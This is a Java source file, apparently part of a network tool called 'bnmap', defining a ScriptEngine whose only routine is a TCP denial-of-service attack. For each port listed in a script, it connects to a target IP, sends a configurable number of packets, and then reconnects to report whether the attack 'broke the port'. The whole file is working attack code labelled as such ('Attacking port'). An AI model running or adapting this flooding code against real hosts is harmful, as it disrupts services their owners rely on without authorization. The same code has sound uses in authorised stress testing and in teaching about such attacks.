package com.bnmap;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Arrays;
import java.util.List;

public class ScriptEngine {

	public static void executeScript(ScriptProperties scriptProperties) {
		// TODO Auto-generated method stub
		
		System.out.println("Executing script "+scriptProperties.getName());
		
		if(scriptProperties.getType().equals("Dos")) 
		{
			// As the ports are separated by commas. Storing them into a list.
			List<String> ports = Arrays.asList(scriptProperties.getPorts().split("\\s*,\\s*"));
			
			if (scriptProperties.getProtocol().equals("TCP"))
			{
				for(String port: ports)
				{
					System.out.println("Attacking port "+ port);
					
					Socket socket = null; 
					DataOutputStream dataOutput = null; 
					
					try 
					{
						socket = new Socket(scriptProperties.getIP(),Integer.valueOf(port));
						dataOutput = new DataOutputStream(socket.getOutputStream());
						
						for(int i=0;i<scriptProperties.getNumberPacketsPerPort(); i++)
						{
							 try 
							 {
								 dataOutput.write(1);
								 dataOutput.writeUTF("Test?");
								 dataOutput.flush();
							 }
							 catch(Exception ex)
							 {
								 System.out.println("It seems the port "+ port +" is closed now!");
								 ex.printStackTrace();
								 break;
							 }
						}
						socket.close();
					} catch (NumberFormatException | IOException e) {
					 ((Throwable) e).printStackTrace(); 	
					}
					
					try {
						Socket verifySocket = new Socket(scriptProperties.getIP(), Integer.valueOf(port));
						System.out.println("It seems the port "+ port + "is Still Alive!");
					}
					catch (Exception ex) 
					{
						System.out.println("It Seem we broke the port "+port);
					}
				}
			}
		
		}
	}

	
}
